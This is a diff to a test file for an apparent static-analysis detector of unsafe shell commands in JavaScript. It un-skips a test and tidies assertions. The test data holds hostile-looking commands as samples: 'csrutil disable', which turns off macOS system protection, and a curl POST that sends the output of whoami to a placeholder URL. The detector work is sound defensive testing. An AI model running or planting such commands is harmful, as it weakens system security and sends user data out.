@@ -33,8 +33,7 @@ test("should detect csrutil command", () => {
   });
 });
 
-// TODO: de-skip when the tracer would be ready
-test.skip("should detect hidden csrutil command", () => {
+test("should detect hidden csrutil command", () => {
   COMMAND_TYPES.forEach((cmdType) => {
     const isArrayBased = cmdType === "spawn" || cmdType === "spawnSync";
     const args = isArrayBased ? `"csrutil", ["status"]` : `"csrutil status"`;
@@ -60,9 +59,7 @@ test("should detect csrutil command with require", () => {
     const isArrayBased = cmdType === "spawn" || cmdType === "spawnSync";
     const args = isArrayBased ? `"csrutil", ["disable"]` : `"csrutil disable"`;
 
-    const str = `
-      require("child_process").${cmdType}(${args});
-    `;
+    const str = `require("child_process").${cmdType}(${args});`;
 
     const ast = parseScript(str);
     const sastAnalysis = getSastAnalysis(isUnsafeCommand)
@@ -85,8 +82,8 @@ test("should transform template literal arg who are to template literal to liter
     .execute(ast.body);
 
   const result = sastAnalysis.warnings();
-  assert.equal(result.at(0).kind, kWarningUnsafeCommand);
-  assert.equal(result.at(0).value, `curl -X POST -d \${${0}} "$(whoami)" \${${1}} <URL>/c`);
+  assert.equal(result.at(0)!.kind, kWarningUnsafeCommand);
+  assert.equal(result.at(0)!.value, `curl -X POST -d \${${0}} "$(whoami)" \${${1}} <URL>/c`);
 });
 
 test("should not detect non suspicious command", () => {
